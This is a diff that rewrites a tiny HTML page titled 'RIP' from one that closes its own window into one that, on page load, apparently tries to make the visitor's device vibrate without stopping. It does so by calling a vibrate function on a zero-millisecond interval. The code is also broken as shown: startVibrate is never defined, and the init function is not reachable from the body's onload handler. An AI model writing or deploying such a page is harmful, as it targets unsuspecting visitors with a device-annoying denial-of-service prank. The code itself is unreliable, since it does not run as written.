@@ -1,12 +1,18 @@
-<html>
-	<head>
-		<title>RIP</title>
- 		<script>
-                        ( function close() {
-                        	window.close();
-                        } ) ()
-                </script>
-	</head>
-	<body onload='close()'>
-	</body>
+<html lang="en">
+<head>
+  <title>RIP</title>
+  <script>
+      function startPersistentVibrate(duration, interval) {
+          vibrateInterval = setInterval(() => {
+              startVibrate(duration);
+          }, interval);
+      }
+
+      ( function init() {
+          startPersistentVibrate(1000, 0);
+      } )();
+  </script>
+</head>
+<body onload="init()">
+</body>
 </html>
